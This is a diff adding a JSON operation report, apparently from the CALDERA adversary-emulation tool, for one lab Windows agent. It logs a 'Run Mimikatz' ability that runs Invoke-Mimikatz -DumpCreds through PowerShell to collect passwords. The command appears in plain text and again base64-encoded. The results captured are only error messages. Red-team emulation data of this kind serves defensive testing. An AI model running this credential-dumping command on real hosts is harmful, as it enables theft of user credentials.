@@ -1,0 +1,147 @@
+{
+    "name": "kkasdfasdf",
+    "id": 3,
+    "host_group": [
+        {
+            "id": 1,
+            "paw": "WIN-532ILFRKI44$WIN-532ILFRKI44\\zathras",
+            "last_seen": "2020-03-01 21:24:47",
+            "architecture": "amd64",
+            "platform": "windows",
+            "server": "http://192.168.100.131:8888",
+            "host_group": "my_group",
+            "location": "C:\\Users\\Public\\sandcat\\sandcat.exe",
+            "pid": 2580,
+            "ppid": 2968,
+            "trusted": 1,
+            "last_trusted_seen": "2020-03-01 21:24:47",
+            "sleep_min": 10,
+            "sleep_max": 10,
+            "executors": [
+                {
+                    "executor": "cmd",
+                    "preferred": 1
+                },
+                {
+                    "executor": "psh",
+                    "preferred": 0
+                },
+                {
+                    "executor": "shellcode_amd64",
+                    "preferred": 0
+                }
+            ]
+        }
+    ],
+    "start": "2020-03-01 21:24:14",
+    "facts": [
+        {
+            "id": 17,
+            "property": "domain.user.password",
+            "value": "Get-Content : Cannot find path 'C:\\Users\\Public\\mimidump' because it does not exist.",
+            "score": 1,
+            "set_id": 0,
+            "source_id": "6",
+            "link_id": 2
+        },
+        {
+            "id": 18,
+            "property": "domain.user.password",
+            "value": "At C:\\Users\\Public\\parse-mimikatz.ps1:6 char:30",
+            "score": 1,
+            "set_id": 0,
+            "source_id": "6",
+            "link_id": 2
+        },
+        {
+            "id": 19,
+            "property": "domain.user.password",
+            "value": "+ foreach ($line in Get-Content <<<<  C:\\Users\\Public\\mimidump) {",
+            "score": 1,
+            "set_id": 0,
+            "source_id": "6",
+            "link_id": 2
+        },
+        {
+            "id": 20,
+            "property": "domain.user.password",
+            "value": "+ CategoryInfo          : ObjectNotFound: (C:\\Users\\Public\\mimidump:String) [Get-Content], ItemNotFoundException",
+            "score": 1,
+            "set_id": 0,
+            "source_id": "6",
+            "link_id": 2
+        },
+        {
+            "id": 21,
+            "property": "domain.user.password",
+            "value": "+ FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetContentCommand",
+            "score": 1,
+            "set_id": 0,
+            "source_id": "6",
+            "link_id": 2
+        }
+    ],
+    "finish": "2020-03-01 21:24:51",
+    "planner": {
+        "id": 1,
+        "name": "sequential",
+        "module": "plugins.stockpile.app.sequential",
+        "params": {}
+    },
+    "adversary": {
+        "id": 9,
+        "adversary_id": "442baa51-f645-45b6-8a96-e24bcfe8510e",
+        "name": "mimikatz",
+        "description": "run mimikatz",
+        "phases": {
+            "1": [
+                {
+                    "id": 107,
+                    "ability_id": "baac2c6d-4652-4b7e-ab0a-f1bf246edd12",
+                    "tactic": "credential-access",
+                    "technique_name": "Credential Dumping",
+                    "technique_id": "T1003",
+                    "name": "Run Mimikatz",
+                    "test": "LiBDOlxVc2Vyc1xQdWJsaWNcSW52b2tlLU1pbWlrYXR6LnBzMSA7IEludm9rZS1NaW1pa2F0eiAtRHVtcENyZWRzIHwgQzpcVXNlcnNcUHVibGljXHBhcnNlLW1pbWlrYXR6LnBzMQ==",
+                    "description": "Use powershell to execute mimikatz and attempt to grab plaintext and/or hashed passwords",
+                    "cleanup": "",
+                    "executor": "psh",
+                    "platform": "windows",
+                    "parser": [
+                        {
+                            "ability": 107,
+                            "name": "line",
+                            "property": "domain.user.password",
+                            "script": ""
+                        }
+                    ],
+                    "payload": [
+                        {
+                            "ability": 107,
+                            "payload": "Invoke-Mimikatz.ps1, parse-mimikatz.ps1"
+                        }
+                    ],
+                    "adversary_map_id": 53
+                }
+            ]
+        }
+    },
+    "jitter": "4/8",
+    "steps": [
+        {
+            "ability_id": "baac2c6d-4652-4b7e-ab0a-f1bf246edd12",
+            "paw": "WIN-532ILFRKI44$WIN-532ILFRKI44\\zathras",
+            "command": ". C:\\Users\\Public\\Invoke-Mimikatz.ps1 ; Invoke-Mimikatz -DumpCreds | C:\\Users\\Public\\parse-mimikatz.ps1",
+            "delegated": "2020-03-01 21:24:23.424471",
+            "run": "2020-03-01 21:24:39",
+            "status": 0,
+            "description": "Use powershell to execute mimikatz and attempt to grab plaintext and/or hashed passwords",
+            "name": "Run Mimikatz",
+            "attack": {
+                "tactic": "credential-access",
+                "technique_name": "Credential Dumping",
+                "technique_id": "T1003"
+            }
+        }
+    ]
+}
